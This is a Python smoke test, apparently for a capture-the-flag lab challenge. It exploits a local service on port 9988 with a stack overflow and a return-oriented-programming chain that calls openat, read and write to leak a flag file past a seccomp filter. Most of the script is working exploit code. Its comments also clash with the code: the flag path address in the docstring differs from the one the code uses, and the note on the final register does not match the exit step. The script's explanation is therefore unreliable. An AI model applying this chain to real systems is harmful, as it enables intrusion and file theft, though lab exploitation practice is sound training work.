#!/usr/bin/env python3
"""Smoke test for orw-002 (port 9988): openat/read/write ROP behind a
STRICT seccomp filter (only open/openat/read/write/exit; execve dies
with SIGSYS), no-PIE, NX ON.

The banner hands the five gadgets (pop rdi/rsi/rdx/rax + syscall; ret).
The .data anchors are offline facts (measured in the lab container,
no-PIE = fixed):
  flag_path "orw-002.flag" at 0x404048
  out_buf (read destination) at 0x404080

The chain (syscall; ret per leg, three legs + the exit):
  openat(AT_FDCWD=-100, path, 0) -> fd 3
  read(3, out_buf, 0x100)
  write(1, out_buf, 0x100)
  exit(0)                       (the clean stop; rdi=1 survives)

main() NULs the last read byte (input[n - 1] = 0): the chain ends with
the syscall gadget whose top byte is already 0x00, nothing is lost.

Success output (the raw 0x100 bytes carry the flag line):

  FLAG{mr5_orw_strict_filter}
"""

import re
import socket
import struct

HOST = "127.0.0.1"
PORT = 9988

PAD = 16  # small[8] + saved rbp

PATH_ADDR = 0x404050
BUF_ADDR = 0x404080

p64 = lambda x: struct.pack("<Q", x & (2**64 - 1))


def recv_until(s, needle, limit=65536):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # the banner: the five gadgets
    banner = recv_until(s, b"name? ")
    m = re.search(
        rb"rdi\(\) at 0x([0-9a-f]+) rsi\(\) at 0x([0-9a-f]+) "
        rb"rdx\(\) at 0x([0-9a-f]+) rax\(\) at 0x([0-9a-f]+) "
        rb"syscall\(\) at 0x([0-9a-f]+)",
        banner,
    )
    assert m, f"no gadget addresses in banner: {banner[:120]!r}"
    # each gadget is a real function: the usable instruction (pop ret)
    # sits 4 bytes past the push rbp; mov rsp,rbp prologue
    g_rdi, g_rsi, g_rdx, g_rax, g_sys = (int(m.group(i), 16) + 4 for i in range(1, 6))
    print(
        f"[+] rdi={g_rdi:#x} rsi={g_rsi:#x} rdx={g_rdx:#x} "
        f"rax={g_rax:#x} syscall={g_sys:#x}"
    )

    def leg(rdi, rsi, rdx, rax):
        return (
            p64(g_rdi)
            + p64(rdi)
            + p64(g_rsi)
            + p64(rsi)
            + p64(g_rdx)
            + p64(rdx)
            + p64(g_rax)
            + p64(rax)
            + p64(g_sys)
        )

    chain = (
        leg(-100 & (2**64 - 1), PATH_ADDR, 0, 257)  # openat
        + leg(3, BUF_ADDR, 0x100, 0)  # read
        + leg(1, BUF_ADDR, 0x100, 1)  # write
        + leg(0, 0, 0, 60)
    )  # exit(0)
    payload = b"A" * PAD + chain
    print(f"[+] payload {len(payload)} bytes (openat/read/write/exit)")
    s.send(payload)

    out = b""
    while b"FLAG{" not in out and len(out) < 8192:
        try:
            chunk = s.recv(4096)
        except (socket.timeout, TimeoutError):
            break  # the write(1) output arrived already or never will
        if not chunk:
            break
        out += chunk
    print(f"[+] output tail: {out[-64:]!r}")
    assert b"FLAG{mr5_orw_strict_filter}" in out, "oracle flag missing"
    print("[+] orw-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
